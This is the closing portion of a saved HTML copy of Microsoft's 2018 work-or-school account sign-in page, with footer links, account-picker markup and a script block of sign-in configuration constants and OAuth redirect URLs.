                        <a id="cred_forgot_password_link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAXWRPW_TUABF43yprRBULDChDkwIJ7af7cSROrhO6jiNnZA4Se2lchy7thP7OfZr7XhkYkHqgpA6siB16MBUwcRIBVIlNiRGJGBkYiT9ASx3ulc6uudJgayQjcc0oBmjNuVwzmABTnMkgRs0xeKAASygCHLGECC6v7X9_euKZF89Ei4_Xn7-snj-8gJ74CAUxo1qNUmSCrRt17QqJvSrVxh2g2E_Mew8X7ICfDS8yMcsYGmKrpNUjSBYjqjRdEX2JEpuzoHi8UiZSEBbEYQijp2uegw0T0NKxgPd0zLFO6aVbObqosZoE32uqDLSJp15b0gQuiilXdVZyJmENF9i5Ka83rZSWR2R3_L3evwJcqjbgJGbWX_ymzaM_KMQxui88BbrhVYgzQQYBJaJKrc1K0CuaSAXBv0IhlaEXCveHcaSrU0BfaiJwrMollJhStaH-9A0jmK-cxizI0Xc6ychY4xP-plFh_W54SmdqNmucYJlAT0dyNJpLHuDiBJVyTb9JWriLUdyO55sw32kJI5itAwWTuv8YjheZMr4II24JG2no5XaeVcor2_1YXBduLuGCtzZThhB211YN0Xsd_EOUWhsbJS3sYe5ndzfIvamtLZFlvNXjV9P9z68-FF6_Wkrd12qZmwgOvaMR4NlV-Tate5qbvtLvZtR7QM0agnC6ZRxe21qZcS7ZIM8K2Nn5fL7zf9Z_gc1&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+7">Work or school account</a>
                    </div>
                </div>
            </div>
        </div>

        

    <div id="alternative-identity-providers">


    </div>

        <div id="guest_hint_text" class="guest_direction_hint smalltext no_display">Don�t have an account assigned by your work or school?</div>
        <div class="guest_redirect_container no_display">
            <span class="guest_redirect smalltext">
                <span>
                    <a id="guest_redirect_link" tabindex="20" href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXWRPWzTUACE-_KnpkJQsZQJdWBCJLH9bCeO1CF1Usdp7IT81lkiJ7FrO7afY7_GjkcmFqQuCCkjC1KHDkwVTIxUIFViQ2JEAkYmRlJ2llvuTjrd9zhJ5snyIxrSjFqccDlOZWGO5kgip9IUm4MMZCFFkDOGgP79nd1vX1Yk-_Ihf_nh8tNn-9mLNciObXOp5afIuQB7BsZeUC4UwjDMI103p_-MwhUANwD8AGCdSGturt-9SAQsZGmKLpFUkSBYjijSdF6yREqqzqFsVbA8FKGyIghZGBjN3ilULAXLcQWOLCWWrVNajmfmSFAYZTiayz0JK8PGvNUliJEgRs2eYUuxiBVHZKSqtOnWIqnXJ78m7rUqZ9igbgX5Zqz9TmR15DtjDwV4nXwDWp7mijMeua42xfnbmOZic6piE7ltH3maj00tOOgGoq5MIH2iCPxTPxAjfkKWukdoqo6DSuMkYPuycNgOPUYdnLVjjfZKc9WSG361XuR4TYOjqCOJy0CyOj4l9ER96ixwNVczRLNhSTo6wnJoyGpNZdGkVLG7AzuWB8eRz4VRPeqveo23yczmVge518m7m1GuOdv3fKSbtnaTAr9Sd4hkeXs7swsebO1v_UmB1-kNOTKTuCr_fHL4_vn39KuPO1vX6ULMuoKhzyq4s2gKXL3YXM11ZzFqxlT9GPdrPL-cMGarTq3U4IAsk-cZcJ7JvMv-j_Jf0&amp;estsfed=1&amp;uaid=3179d3dd9536431eaec1aecccd6c828d&amp;mkt=en-US">Sign in with a Microsoft account</a>
                </span>
            </span>
        </div>
    </li>
        
    <li id="disambig-container" class="smalltext marginTop30px" style="display: none;">
        <div id="disambig-help-container">
            
            Tired of seeing this? <a href="#" id="iDisambigRenameLink">Rename your personal Microsoft account.</a>
        </div>
    </li>

</ul>








                            </div>
                            <div class="push">
                            </div>
                        </div>


<div id="footer_links_container" class="login_footer_container" role="contentinfo">
    <div class="footer_inner_container">
        <div id="footer_table" class="footer_block">
                <div class="corporate_footer">
                        <div>
                            <span class="footer_link text-caption" id="footer_copyright_link">
&#169; 2018 Microsoft                            </span>
                        </div>
                        <div>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_terms" href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
                            </span>
                            <span class="footer_link">
                                <a class="text-caption" id="footer_link_privacy" href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy &amp; cookies</a>
                            </span>
                        </div>
                </div>
                    <div class="footer_glyph">
                        <img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/images/microsoft_logo.png" alt="Microsoft account symbol" />
                    </div>
        </div>
    </div>
</div>
<div id="login_prefetch_container" class="no-display">
</div>
                    </td>
                </tr>
            </table>
        </div>
        

<script type="text/javascript">
    var Constants = Constants || {};
    Constants.MEMBER_NAME = "";

    
    Constants.REDIRECT_MESSAGES =
    {
        'AAD': "We\u0027re taking you to your organization\u0027s sign-in page.",
        'MSA': "We�re taking you to the Microsoft account sign-in page.",
        'CLOUDFEDERATED': "We\u0027re taking you to your organization\u0027s sign-in page."
    };

    Constants.FEDERATION_QUERY_PARAMETERS = '?mkt=en-US&client-request-id=3179d3dd-9536-431e-aec1-aecccd6c828d&username=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAXWRPW_TUABF43yprRBULDChDkwIJ7af7cSROrhO6jiNnZA4Se2lchy7thP7OfZr7XhkYkHqgpA6siB16MBUwcRIBVIlNiRGJGBkYiT9ASx3ulc6uudJgayQjcc0oBmjNuVwzmABTnMkgRs0xeKAASygCHLGECC6v7X9_euKZF89Ei4_Xn7-snj-8gJ74CAUxo1qNUmSCrRt17QqJvSrVxh2g2E_Mew8X7ICfDS8yMcsYGmKrpNUjSBYjqjRdEX2JEpuzoHi8UiZSEBbEYQijp2uegw0T0NKxgPd0zLFO6aVbObqosZoE32uqDLSJp15b0gQuiilXdVZyJmENF9i5Ka83rZSWR2R3_L3evwJcqjbgJGbWX_ymzaM_KMQxui88BbrhVYgzQQYBJaJKrc1K0CuaSAXBv0IhlaEXCveHcaSrU0BfaiJwrMollJhStaH-9A0jmK-cxizI0Xc6ychY4xP-plFh_W54SmdqNmucYJlAT0dyNJpLHuDiBJVyTb9JWriLUdyO55sw32kJI5itAwWTuv8YjheZMr4II24JG2no5XaeVcor2_1YXBduLuGCtzZThhB211YN0Xsd_EOUWhsbJS3sYe5ndzfIvamtLZFlvNXjV9P9z68-FF6_Wkrd12qZmwgOvaMR4NlV-Tate5qbvtLvZtR7QM0agnC6ZRxe21qZcS7ZIM8K2Nn5fL7zf9Z_gc1'.substr(1);
    Constants.CONTEXT = 'rQIIAXWRPW_TUABF43yprRBULDChDkwIJ7af7cSROrhO6jiNnZA4Se2lchy7thP7OfZr7XhkYkHqgpA6siB16MBUwcRIBVIlNiRGJGBkYiT9ASx3ulc6uudJgayQjcc0oBmjNuVwzmABTnMkgRs0xeKAASygCHLGECC6v7X9_euKZF89Ei4_Xn7-snj-8gJ74CAUxo1qNUmSCrRt17QqJvSrVxh2g2E_Mew8X7ICfDS8yMcsYGmKrpNUjSBYjqjRdEX2JEpuzoHi8UiZSEBbEYQijp2uegw0T0NKxgPd0zLFO6aVbObqosZoE32uqDLSJp15b0gQuiilXdVZyJmENF9i5Ka83rZSWR2R3_L3evwJcqjbgJGbWX_ymzaM_KMQxui88BbrhVYgzQQYBJaJKrc1K0CuaSAXBv0IhlaEXCveHcaSrU0BfaiJwrMollJhStaH-9A0jmK-cxizI0Xc6ychY4xP-plFh_W54SmdqNmucYJlAT0dyNJpLHuDiBJVyTb9JWriLUdyO55sw32kJI5itAwWTuv8YjheZMr4II24JG2no5XaeVcor2_1YXBduLuGCtzZThhB211YN0Xsd_EOUWhsbJS3sYe5ndzfIvamtLZFlvNXjV9P9z68-FF6_Wkrd12qZmwgOvaMR4NlV-Tate5qbvtLvZtR7QM0agnC6ZRxe21qZcS7ZIM8K2Nn5fL7zf9Z_gc1';
    Constants.BASE_URL = '/common/reprocess?';
    Constants.LATENCY_THRESHOLD = 2000;

    Constants.CDN_IMAGE_PATH = 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/images/';
    Constants.PREFETCH_URL = "https://www.office.com/prefetch/prefetch";
    Constants.IS_USE_OTHER_ACCOUNT_VISIBLE = true;
    Constants.OTHER_ACCOUNT_TEXT = "Use another account";
    Constants.MAX_USER_TILES = 5;

    Constants.PARTNER_NAME = "Work or school, or personal Microsoft account";
    Constants.DIR = 'ltr';
    Constants.METRICS_MODE = 5;  // Client metrics mode.

    if (Constants.TokenizedStringMsgs)
    {
        
        Constants.TokenizedStringMsgs.GENERIC_ERROR = "\u003cH1\u003eSorry, but we\u0027re having trouble signing you in\u003c/H1\u003e\u003cp\u003ePlease try again in a few minutes. If this doesn\u0027t work, you might want to contact your admin and report the following error: #~#ErrorCode#~#.\u003c/p\u003e";
        Constants.TokenizedStringMsgs.UPN_DISAMBIGUATE_MESSAGE = "It looks like {0} is used with more than one account. Which account do you want to use?";
    }

    
    Constants.FLOW_TOKEN = '';
    Constants.FLOW_TOKEN_COOKIE_NAME = 'ESTSWCTXFLOWTOKEN';
    Constants.LCID = "1033";
    Constants.MSA_ACCOUNT_IMG_ALT_TEXT = "Microsoft account symbol";
    Constants.AAD_ACCOUNT_IMG_ALT_TEXT = "Work or school account symbol";
    Constants.MSA_ACCOUNT_TILE_ALT_TEXT = "Microsoft account for {0}";
    Constants.AAD_ACCOUNT_TILE_ALT_TEXT = "Work or school account for {0}";
    Constants.REALM_RESOLVER_URL = "/common/userrealm";
    Constants.FORCED_SIGN_IN = false;
    Constants.MSA_AUTH_URL = 'https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWRPWzTUACE-_KnpkJQsZQJdWBCJLH9bCeO1CF1Usdp7IT81lkiJ7FrO7afY7_GjkcmFqQuCCkjC1KHDkwVTIxUIFViQ2JEAkYmRlJ2llvuTjrd9zhJ5snyIxrSjFqccDlOZWGO5kgip9IUm4MMZCFFkDOGgP79nd1vX1Yk-_Ihf_nh8tNn-9mLNciObXOp5afIuQB7BsZeUC4UwjDMI103p_-MwhUANwD8AGCdSGturt-9SAQsZGmKLpFUkSBYjijSdF6yREqqzqFsVbA8FKGyIghZGBjN3ilULAXLcQWOLCWWrVNajmfmSFAYZTiayz0JK8PGvNUliJEgRs2eYUuxiBVHZKSqtOnWIqnXJ78m7rUqZ9igbgX5Zqz9TmR15DtjDwV4nXwDWp7mijMeua42xfnbmOZic6piE7ltH3maj00tOOgGoq5MIH2iCPxTPxAjfkKWukdoqo6DSuMkYPuycNgOPUYdnLVjjfZKc9WSG361XuR4TYOjqCOJy0CyOj4l9ER96ixwNVczRLNhSTo6wnJoyGpNZdGkVLG7AzuWB8eRz4VRPeqveo23yczmVge518m7m1GuOdv3fKSbtnaTAr9Sd4hkeXs7swsebO1v_UmB1-kNOTKTuCr_fHL4_vn39KuPO1vX6ULMuoKhzyq4s2gKXL3YXM11ZzFqxlT9GPdrPL-cMGarTq3U4IAsk-cZcJ7JvMv-j_Jf0&estsfed=1&uaid=3179d3dd9536431eaec1aecccd6c828d&mkt=en-US';
    Constants.IS_CXH_REQUEST = false;
    Constants.IS_ADAL_REQUEST = false;
    Constants.IS_NAME_COEXISTENCE_ACCOUNT = false;

    Constants.ADAL_UX_OVERRIDE = false;
    Constants.CANCEL_REDIRECT_URL = 'https://www.office.com/';
    Constants.IS_MSA_FED_SUPPORTED = true;
    Constants.IS_MSA_PHONE_USERNAME_SUPPORTED = true;
    Constants.IS_MSA_REDIR_SUPPORTED = false;
    Constants.MSA_DOMAIN = 'live.com';
    Constants.PROMPT = '';
    Constants.CLICKFORMORE = "Click for more actions";
    Constants.CONNECTEDTOWINDOWS = "Connected to Windows";
    Constants.SIGNEDIN = "Signed in";
    Constants.CLICKTOSIGNIN = "";
    Constants.SIGNINGOUT = "Signing out...";
    Constants.USERNAME_HINT_TEXT = 'Email or phone';
    Constants.IS_LOGOUT_REQUEST = false;
    Constants.SHOULD_HIDE_SIGNUP = false;
    Constants.USE_DARK_TILE_LOGO = false;
    Constants.HAS_ERROR = false;
    Constants.IS_MOBILE = false;
    Constants.uxLogoutUrl = "https://login.microsoftonline.com/common/uxlogout";
    Constants.forgetUrl = "https://login.microsoftonline.com/forgetuser";
    Constants.IS_HOLOGRAPHIC = false;
    Constants.Header_Text_Username = 'Sign in with your work account';
    Constants.Header_Text_Password = 'Enter your password';
    Constants.Header_Text_Privacy = 'Privacy statement';
    Constants.Use_Client_Check_Msa_Flag = true;
    Constants.DisambigHelpUrl = "https://go.microsoft.com/fwlink/p/?LinkID=733247";
    Constants.CxhFlow = "";
    Constants.isChinaDC = false;
    Constants.Locale = "en-US";
    Constants.IsB2CScenario = false;
    Constants.appRedirectUrl = 'https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWRPWzTUACE-_KnpkJQsZQJdWBCJLH9bCeO1CF1Usdp7IT81lkiJ7FrO7afY7_GjkcmFqQuCCkjC1KHDkwVTIxUIFViQ2JEAkYmRlJ2llvuTjrd9zhJ5snyIxrSjFqccDlOZWGO5kgip9IUm4MMZCFFkDOGgP79nd1vX1Yk-_Ihf_nh8tNn-9mLNciObXOp5afIuQB7BsZeUC4UwjDMI103p_-MwhUANwD8AGCdSGturt-9SAQsZGmKLpFUkSBYjijSdF6yREqqzqFsVbA8FKGyIghZGBjN3ilULAXLcQWOLCWWrVNajmfmSFAYZTiayz0JK8PGvNUliJEgRs2eYUuxiBVHZKSqtOnWIqnXJ78m7rUqZ9igbgX5Zqz9TmR15DtjDwV4nXwDWp7mijMeua42xfnbmOZic6piE7ltH3maj00tOOgGoq5MIH2iCPxTPxAjfkKWukdoqo6DSuMkYPuycNgOPUYdnLVjjfZKc9WSG361XuR4TYOjqCOJy0CyOj4l9ER96ixwNVczRLNhSTo6wnJoyGpNZdGkVLG7AzuWB8eRz4VRPeqveo23yczmVge518m7m1GuOdv3fKSbtnaTAr9Sd4hkeXs7swsebO1v_UmB1-kNOTKTuCr_fHL4_vn39KuPO1vX6ULMuoKhzyq4s2gKXL3YXM11ZzFqxlT9GPdrPL-cMGarTq3U4IAsk-cZcJ7JvMv-j_Jf0&estsfed=1&uaid=3179d3dd9536431eaec1aecccd6c828d&mkt=en-US';
    Constants.msaSignupUrl = 'https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWRPWzTUACE-_KnpkJQsZQJdWBCJLH9bCeO1CF1Usdp7IT81lkiJ7FrO7afY7_GjkcmFqQuCCkjC1KHDkwVTIxUIFViQ2JEAkYmRlJ2llvuTjrd9zhJ5snyIxrSjFqccDlOZWGO5kgip9IUm4MMZCFFkDOGgP79nd1vX1Yk-_Ihf_nh8tNn-9mLNciObXOp5afIuQB7BsZeUC4UwjDMI103p_-MwhUANwD8AGCdSGturt-9SAQsZGmKLpFUkSBYjijSdF6yREqqzqFsVbA8FKGyIghZGBjN3ilULAXLcQWOLCWWrVNajmfmSFAYZTiayz0JK8PGvNUliJEgRs2eYUuxiBVHZKSqtOnWIqnXJ78m7rUqZ9igbgX5Zqz9TmR15DtjDwV4nXwDWp7mijMeua42xfnbmOZic6piE7ltH3maj00tOOgGoq5MIH2iCPxTPxAjfkKWukdoqo6DSuMkYPuycNgOPUYdnLVjjfZKc9WSG361XuR4TYOjqCOJy0CyOj4l9ER96ixwNVczRLNhSTo6wnJoyGpNZdGkVLG7AzuWB8eRz4VRPeqveo23yczmVge518m7m1GuOdv3fKSbtnaTAr9Sd4hkeXs7swsebO1v_UmB1-kNOTKTuCr_fHL4_vn39KuPO1vX6ULMuoKhzyq4s2gKXL3YXM11ZzFqxlT9GPdrPL-cMGarTq3U4IAsk-cZcJ7JvMv-j_Jf0&estsfed=1&uaid=3179d3dd9536431eaec1aecccd6c828d&signup=1&lw=1&fl=easi2&mkt=en-US';
    Constants.footerTermsUrl = 'https://www.microsoft.com/en-US/servicesagreement/';
    Constants.footerPrivacyUrl = 'https://privacy.microsoft.com/en-US/privacystatement';
    Constants.uxPreviewOptInUrl = 'https://login.microsoftonline.com/common/uxpreview/optin';
    Constants.refreshUrl = 'https://login.microsoftonline.com/common/reprocess?ctx=rQIIAXWRPW_TUABF43yprRBULDChDkwIJ7af7cSROrhO6jiNnZA4Se2lchy7thP7OfZr7XhkYkHqgpA6siB16MBUwcRIBVIlNiRGJGBkYiT9ASx3ulc6uudJgayQjcc0oBmjNuVwzmABTnMkgRs0xeKAASygCHLGECC6v7X9_euKZF89Ei4_Xn7-snj-8gJ74CAUxo1qNUmSCrRt17QqJvSrVxh2g2E_Mew8X7ICfDS8yMcsYGmKrpNUjSBYjqjRdEX2JEpuzoHi8UiZSEBbEYQijp2uegw0T0NKxgPd0zLFO6aVbObqosZoE32uqDLSJp15b0gQuiilXdVZyJmENF9i5Ka83rZSWR2R3_L3evwJcqjbgJGbWX_ymzaM_KMQxui88BbrhVYgzQQYBJaJKrc1K0CuaSAXBv0IhlaEXCveHcaSrU0BfaiJwrMollJhStaH-9A0jmK-cxizI0Xc6ychY4xP-plFh_W54SmdqNmucYJlAT0dyNJpLHuDiBJVyTb9JWriLUdyO55sw32kJI5itAwWTuv8YjheZMr4II24JG2no5XaeVcor2_1YXBduLuGCtzZThhB211YN0Xsd_EOUWhsbJS3sYe5ndzfIvamtLZFlvNXjV9P9z68-FF6_Wkrd12qZmwgOvaMR4NlV-Tate5qbvtLvZtR7QM0agnC6ZRxe21qZcS7ZIM8K2Nn5fL7zf9Z_gc1';
    Constants.showOptInBanner = true;


    Constants.SplitterControlData = [
    {
        "name": "Work or school account",
        "login": "Created by your IT department",
        "image": "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/images/work_account.png",
        "link": 'MSLogin.SplitterControl.LoginAAD',
        "authUrl": '',
        "id": 'aad_account_tile',
        "domainHint": ''
    }, {
        "name": "Personal account",
        "login": "Created by you",
        "image": "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6644.15/content/images/personal_account.png",
        "link": 'MSLogin.SplitterControl.LoginMSA',
        "authUrl": 'https://login.live.com/oauth20_authorize.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWRPWzTUACE-_KnpkJQsZQJdWBCJLH9bCeO1CF1Usdp7IT81lkiJ7FrO7afY7_GjkcmFqQuCCkjC1KHDkwVTIxUIFViQ2JEAkYmRlJ2llvuTjrd9zhJ5snyIxrSjFqccDlOZWGO5kgip9IUm4MMZCFFkDOGgP79nd1vX1Yk-_Ihf_nh8tNn-9mLNciObXOp5afIuQB7BsZeUC4UwjDMI103p_-MwhUANwD8AGCdSGturt-9SAQsZGmKLpFUkSBYjijSdF6yREqqzqFsVbA8FKGyIghZGBjN3ilULAXLcQWOLCWWrVNajmfmSFAYZTiayz0JK8PGvNUliJEgRs2eYUuxiBVHZKSqtOnWIqnXJ78m7rUqZ9igbgX5Zqz9TmR15DtjDwV4nXwDWp7mijMeua42xfnbmOZic6piE7ltH3maj00tOOgGoq5MIH2iCPxTPxAjfkKWukdoqo6DSuMkYPuycNgOPUYdnLVjjfZKc9WSG361XuR4TYOjqCOJy0CyOj4l9ER96ixwNVczRLNhSTo6wnJoyGpNZdGkVLG7AzuWB8eRz4VRPeqveo23yczmVge518m7m1GuOdv3fKSbtnaTAr9Sd4hkeXs7swsebO1v_UmB1-kNOTKTuCr_fHL4_vn39KuPO1vX6ULMuoKhzyq4s2gKXL3YXM11ZzFqxlT9GPdrPL-cMGarTq3U4IAsk-cZcJ7JvMv-j_Jf0&estsfed=1&uaid=3179d3dd9536431eaec1aecccd6c828d&mkt=en-US',
        "id": 'mso_account_tile',
        "domainHint": 'msa'
    }];

    
    Constants.responseMode="FormPost";
    
    
    Constants.cancelErrorParams={"error":"access_denied","error_subcode":"cancel","state":"OpenIdConnect.AuthenticationProperties%3dSsIfYb34XYGCQrsIxCb18SFoca_sAJXs6UNGBPwp5aVuPze4p8kajNJrDH79Cee3ZxRMIvsMjRr2GTIfcmqtD-EhIiJjMfoFtNwhNaEa6ob8AlSVlzNVKxr9wxHxUyTJ"};

        Constants.desktopSsoConfig =
        {
            iwaEndpointUrlFormat: "https://autologon.microsoftazuread-sso.com/{0}/winauth/sso?desktopsso=true&isAdalRequest=False",
            iwaRequestTimeoutInMs: -2147483648,
            lastUsernameTried: "",
            startDesktopSsoOnPageLoad: false,
            hintedDomainName: "",
            progressAnimationTimeout: 10000,
            isEdgeAllowed: false,
            isSafariAllowed: true
        };

    Constants.onPremPasswordValidationConfig =
    {
        isUserRealmPrecheckEnabled: true
    }

    

    // Setup cta message fields.
    window.$Do.when("User", 0, function ()
    {
        User.setupCallToActionMessages();
    });

    // Other tile
    var Tiles = Tiles || {};
    Tiles.otherJSON = {
        'name': 'Use another account',
        'login': '',
        'imageAAD': 'other_glyph.png',
        'imageMSA': 'other_glyph.png',
        'isLive': false,
        'link': 'other',
        'authUrl': '',
        'sessionID': '',
        'domainHint': 'other'
    };
</script>

    </body>
</html>
